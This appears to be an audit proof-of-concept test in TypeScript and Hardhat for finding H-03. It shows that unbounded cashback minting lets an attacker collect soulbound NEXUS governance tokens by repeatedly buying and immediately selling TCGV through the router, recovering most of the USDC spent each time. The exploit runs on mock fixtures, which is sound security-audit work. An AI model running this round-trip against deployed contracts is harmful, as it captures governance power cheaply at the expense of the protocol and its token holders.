/**
 * PoC for H-03: Unbounded, wash-tradeable cashback minting allows an attacker to acquire
 * permanent NEXUS governance tokens while recovering the overwhelming majority of their
 * principal via a same-block buy-then-sell round trip through TCGVaultBuyRouter.
 *
 * Root cause (contracts/TCGNexusToken.sol:95-102, contracts/TCGVaultToken.sol:597-606,
 * contracts/TCGVaultBuyRouter.sol:258-341):
 *   - mintCashback() has no supply cap, no per-recipient cap, no rate limit.
 *   - The minted amount is proportional to the raw quantity of TCGV received from the AMM
 *     swap (recordBuyAndMintCashback(msg.sender, tcgvReceived)), not to USDC value retained.
 *   - Nothing binds the cashback to *holding* the purchased TCGV — the buyer can sell it
 *     back in the same transaction and keep the NEXUS permanently (NEXUS is soulbound with
 *     no user burn path: TCGNexusToken._update reverts on any non-mint/burn transfer).
 *
 * This PoC proves, against the real compiled TCGVaultBuyRouter + TCGVaultToken + TCGNexusToken
 * (reusing the project's own MockUniswapV2 fixture from test/A_TCGVaultBuyRouter.test.ts),
 * that an attacker can repeatedly:
 *   1. Buy TCGV with USDC through the router (mints NEXUS cashback on the full swap output).
 *   2. Immediately sell all the received TCGV back through the router.
 *   3. Recover the large majority of the USDC spent (only round-trip fees + price impact lost).
 *   4. Permanently retain 100% of the minted NEXUS (soulbound, cannot be clawed back on this path).
 *
 * The fixture's TCGVaultToken is constructed with `initialLaunch = owner` (an EOA), which can
 * never call finalizePresaleAndRecompute() (it is not the ITCGVaultInitialLaunch contract), so
 * `presaleActive` stays permanently true and the cashback rate is the 30% presale rate for the
 * lifetime of this deployment — demonstrating the amplified case described in the audit.
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";
import hre from "hardhat";
import { parseEther, parseUnits, getContractAddress, zeroAddress } from "viem";

const { viem, networkHelpers } = await hre.network.connect();

async function deployFixture() {
  const wallets = await viem.getWalletClients();
  const owner = wallets[0]!;
  const attacker = wallets[1]!;
  const vault = wallets[2]!;
  const marketing = wallets[3]!;
  const community = wallets[4]!;

  const usdcContract = await viem.deployContract("contracts/test/MockUSDC.sol:MockUSDC", [], { client: { wallet: owner } });
  const usdc = await viem.getContractAt("MockUSDC", usdcContract.address);

  const factoryContract = await viem.deployContract("MockUniswapV2Factory", [], { client: { wallet: owner } });
  const factory = await viem.getContractAt("MockUniswapV2Factory", factoryContract.address);

  const routerContract = await viem.deployContract("MockUniswapV2Router", [factory.address, usdc.address], { client: { wallet: owner } });

  const publicClient = await viem.getPublicClient();
  const n0 = BigInt(await publicClient.getTransactionCount({ address: owner.account.address, blockTag: "pending" }));
  const futureTcgv = getContractAddress({ from: owner.account.address, nonce: n0 + 1n });
  const nexusAddr = getContractAddress({ from: owner.account.address, nonce: n0 });

  await viem.deployContract("TCGNexusToken", [futureTcgv, attacker.account.address, vault.account.address], { client: { wallet: owner } });
  const tcgvContract = await viem.deployContract("TCGVaultToken", [
    zeroAddress,
    routerContract.address,
    vault.account.address,
    marketing.account.address,
    community.account.address,
    nexusAddr,
    owner.account.address, // initialLaunch = EOA -> presaleActive can never be finalized -> stays true (30% rate)
  ], { client: { wallet: owner } });
  const tcgv = await viem.getContractAt("TCGVaultToken", tcgvContract.address);
  const nexus = await viem.getContractAt("TCGNexusToken", nexusAddr);

  await factory.write.createPair([tcgv.address, usdc.address], { account: owner.account });
  const pairAddress = await factory.read.getPair([tcgv.address, usdc.address]);
  const pair = await viem.getContractAt("MockUniswapV2Pair", pairAddress);
  await tcgv.write.setPair([pairAddress, true], { account: owner.account });

  const mintAmount = parseEther("1000000");
  const liqAmount = parseEther("900000");
  await tcgv.write.mintPresale([owner.account.address, mintAmount], { account: owner.account });

  const buyRouter = await viem.deployContract("TCGVaultBuyRouter", [
    routerContract.address,
    usdc.address,
    tcgv.address,
    vault.account.address,
    marketing.account.address,
    community.account.address,
  ], { client: { wallet: owner } });

  await tcgv.write.setBuyRouter([buyRouter.address], { account: owner.account });
  await tcgv.write.setExcludedFromFees([buyRouter.address, true], { account: owner.account });

  const usdcLiq = parseUnits("10000", 6);
  await usdc.write.mint([owner.account.address, usdcLiq], { account: owner.account });
  await usdc.write.transfer([pairAddress, usdcLiq], { account: owner.account });
  await tcgv.write.transfer([pairAddress, liqAmount], { account: owner.account });
  await pair.write.mint([owner.account.address], { account: owner.account });

  return { owner, attacker, usdc, tcgv, nexus, buyRouter };
}

describe("PoC: H-03 wash-tradeable cashback -> cheap governance-token acquisition", () => {
  it("attacker recovers most of their principal in a buy+sell round trip while permanently keeping the minted NEXUS", async () => {
    const { attacker, usdc, tcgv, nexus, buyRouter } = await networkHelpers.loadFixture(deployFixture);

    assert.strictEqual(await tcgv.read.presaleActive(), true, "presaleActive must be true for this fixture");
    assert.strictEqual(await tcgv.read.getCashbackRate(), 3000n, "cashback rate must be the 30% presale rate");

    const cycleUsdc = parseUnits("200", 6); // 200 USDC per cycle
    const cycles = 3;

    let cumulativeUsdcSpent = 0n;
    let cumulativeUsdcRecovered = 0n;
    let cumulativeNexus = 0n;

    for (let i = 1; i <= cycles; i++) {
      await usdc.write.mint([attacker.account.address, cycleUsdc], { account: attacker.account });
      await usdc.write.approve([buyRouter.address, cycleUsdc], { account: attacker.account });

      const nexusBefore = await nexus.read.balanceOf([attacker.account.address]);
      const tcgvBefore = await tcgv.read.balanceOf([attacker.account.address]);
      const usdcBefore = await usdc.read.balanceOf([attacker.account.address]);

      // Step 1: buy TCGV with USDC through the router -> mints NEXUS cashback on the swap output
      await buyRouter.write.buyTCGVWithUSDC(
        [cycleUsdc, 0n, BigInt(Math.floor(Date.now() / 1000) + 300)],
        { account: attacker.account },
      );

      const tcgvReceived = (await tcgv.read.balanceOf([attacker.account.address])) - tcgvBefore;
      const nexusMinted = (await nexus.read.balanceOf([attacker.account.address])) - nexusBefore;
      assert.ok(tcgvReceived > 0n, "must receive TCGV from the swap");
      assert.ok(nexusMinted > 0n, "must receive NEXUS cashback");

      // Step 2: immediately sell all received TCGV back through the router
      await tcgv.write.approve([buyRouter.address, tcgvReceived], { account: attacker.account });
      await buyRouter.write.sellTCGVForUSDC(
        [tcgvReceived, 0n, BigInt(Math.floor(Date.now() / 1000) + 300)],
        { account: attacker.account },
      );

      const usdcAfter = await usdc.read.balanceOf([attacker.account.address]);
      // usdcBefore was captured AFTER minting cycleUsdc but BEFORE the buy. The buy pulls exactly
      // cycleUsdc out, the sell adds sellProceeds back in, so (usdcBefore - usdcAfter) is exactly
      // the net amount of principal lost over the round trip (cycleUsdc - sellProceeds).
      const netCost = usdcBefore - usdcAfter;
      const usdcRecovered = cycleUsdc - netCost; // = sellProceeds
      const tcgvLeftover = await tcgv.read.balanceOf([attacker.account.address]);

      cumulativeUsdcSpent += cycleUsdc;
      cumulativeUsdcRecovered += usdcRecovered;
      cumulativeNexus += nexusMinted;

      const netCostBp = (netCost * 10000n) / cycleUsdc;
      console.log(
        `[cycle ${i}] spent=${cycleUsdc} recovered=${usdcRecovered} netCost=${netCost} ` +
          `(${Number(netCostBp) / 100}% of principal) | NEXUS minted this cycle=${nexusMinted} ` +
          `| TCGV leftover=${tcgvLeftover} | cumulative NEXUS retained=${cumulativeNexus}`,
      );

      // The round trip must recover the large majority of principal: net cost stays well under
      // the naive "spend it all" assumption. This is the core of H-03 — cashback is minted on
      // gross volume, not on retained exposure, so round-tripping is cheap.
      assert.ok(netCostBp < 1500n, `net cost should stay under 15% of principal per cycle, got ${netCostBp} bp`);
    }

    const finalNexus = await nexus.read.balanceOf([attacker.account.address]);
    assert.strictEqual(finalNexus, cumulativeNexus, "NEXUS balance must equal the sum of all cashback mints");

    const totalNetCost = cumulativeUsdcSpent - cumulativeUsdcRecovered;
    const totalNetCostBp = (totalNetCost * 10000n) / cumulativeUsdcSpent;

    console.log(
      `\n[FINAL] Over ${cycles} cycles: spent=${cumulativeUsdcSpent} recovered=${cumulativeUsdcRecovered} ` +
        `netCost=${totalNetCost} (${Number(totalNetCostBp) / 100}% of total principal) | ` +
        `NEXUS permanently retained=${finalNexus} (soulbound, no user burn path exists)`,
    );

    // Prove this is genuinely repeatable, not a one-off artifact of the first trade's price impact:
    // net cost per cycle should not blow up across repeated cycles in this bounded liquidity pool.
    assert.ok(totalNetCostBp < 1500n, "cumulative net cost across repeated cycles should stay under 15%");
  });
});
